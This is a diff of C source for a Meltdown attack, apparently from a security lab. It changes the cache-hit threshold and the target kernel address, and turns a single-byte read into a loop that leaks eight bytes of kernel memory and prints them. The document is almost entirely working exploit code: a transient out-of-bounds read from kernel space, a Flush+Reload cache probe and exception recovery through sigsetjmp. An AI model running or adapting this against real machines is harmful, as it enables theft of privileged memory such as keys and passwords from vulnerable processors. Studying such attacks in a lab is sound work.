@@ -11,7 +11,7 @@
 /*********************** Flush + Reload ************************/
 uint8_t array[256*4096];
 /* cache hit time threshold assumed*/
-#define CACHE_HIT_THRESHOLD (80)
+#define CACHE_HIT_THRESHOLD (100)
 #define DELTA 1024
 
 void flushSideChannel()
@@ -44,10 +44,9 @@ void reloadSideChannelImproved()
 }
 /*********************** Flush + Reload ************************/
 
-void meltdown_asm(unsigned long kernel_data_addr)
+void meltdown_asm(unsigned long kernel_data_addr, int byte)
 {
-   char kernel_data = 0;
-   
+   char kernel_data = 0; 
    // Give eax register something to do
    asm volatile(
        ".rept 400;"                
@@ -60,8 +59,8 @@ void meltdown_asm(unsigned long kernel_data_addr)
    ); 
     
    // The following statement will cause an exception
-   kernel_data = *(char*)kernel_data_addr;  
-   array[kernel_data * 4096 + DELTA] += 1;              
+   kernel_data = *((char*)kernel_data_addr + byte);  
+   array[kernel_data * 4096 + DELTA] += 1;
 }
 
 // signal handler
@@ -87,32 +86,32 @@ int main()
   memset(scores, 0, sizeof(scores));
   flushSideChannel();
   
-	  
-  // Retry 1000 times on the same address.
-  for (i = 0; i < 1000; i++) {
-	ret = pread(fd, NULL, 0, 0);
-	if (ret < 0) {
-	  perror("pread");
-	  break;
-	}
-	
-	// Flush the probing array
-	for (j = 0; j < 256; j++) 
-		_mm_clflush(&array[j * 4096 + DELTA]);
+  for (int byte = 0; byte < 8; ++ byte) {
+    // Retry 1000 times on the same address.
+    for (i = 0; i < 1000; i++) {
+      ret = pread(fd, NULL, 0, 0);
+      if (ret < 0) {
+        perror("pread");
+        break;
+      }
+      
+      // Flush the probing array
+      for (j = 0; j < 256; j++) 
+      	_mm_clflush(&array[j * 4096 + DELTA]);
 
-	if (sigsetjmp(jbuf, 1) == 0) { meltdown_asm(0xfb61b000); }
+      if (sigsetjmp(jbuf, 1) == 0) { meltdown_asm(0xf88be000, byte); }
 
-	reloadSideChannelImproved();
+      reloadSideChannelImproved();
+    }
+
+    // Find the index with the highest score.
+    int max = 0;
+    for (i = 0; i < 256; i++) {
+      if (scores[max] < scores[i]) max = i;
+    }
+    printf("%c", max);
+    for (int i = 0; i < 256; i++) scores[i] = 0;
   }
-
-  // Find the index with the highest score.
-  int max = 0;
-  for (i = 0; i < 256; i++) {
-	if (scores[max] < scores[i]) max = i;
-  }
-
-  printf("The secret value is %d %c\n", max, max);
-  printf("The number of hits is %d\n", scores[max]);
-
+  printf("\n");
   return 0;
 }
